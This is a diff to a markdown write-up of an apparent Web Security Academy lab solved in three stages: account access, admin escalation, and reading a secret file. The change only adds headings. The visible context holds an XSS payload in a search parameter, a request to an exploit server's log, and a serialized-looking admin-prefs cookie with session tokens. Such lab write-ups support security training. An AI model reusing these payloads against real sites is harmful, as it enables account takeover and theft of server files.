@@ -1,4 +1,4 @@
-Stage 1: Access any user account.
+## Stage 1: Access any user account.
 ```
 GET /?SearchTerm=%22-alert%281%29-%22 HTTP/1.1
 Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
@@ -30,7 +30,7 @@ GET /log HTTP/1.1
 Host: exploit-ace81f7f1f46c738c0bf018a01830074.web-security-academy.net
 ```
 
-Stage 2: Use your user account to access the admin interface at /admin, perhaps by elevating your privileges or compromising the administrator account.
+## Stage 2: Use your user account to access the admin interface at /admin, perhaps by elevating your privileges or compromising the administrator account.
 ```
 GET /filtered_search HTTP/1.1
 Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
@@ -65,7 +65,7 @@ Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
 Cookie: admin-prefs=H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d; _lab=46%7cMCwCFHRmGbJvWD83sGJweBsiDTK4uwjJAhREJY7dRXWQs4BBUBb1GL29u8rltqBNSbQvwVMR%2f9LVBAhVe1zcqQBR4hhmDGeLvwixznTtC0dEsAfRJMWjJon387vjohx0Y3TPv8JhXwOrMmjarHJkOy%2fEz2k2MTrIGqhL922Oc8E5610%3d; session=k2tC5PLZFrfYHyxsfTnq4lnzczQAhLWk
 ```
 
-Stage 3: Use the admin interface to read the contents of /home/carlos/secret from the server's filesystem, and submit it using "submit solution".
+## Stage 3: Use the admin interface to read the contents of /home/carlos/secret from the server's filesystem, and submit it using "submit solution".
 ```
 GET /admin-panel HTTP/1.1
 Host: ac351fcc1f7cc747c0be0124004c0005.web-security-academy.net
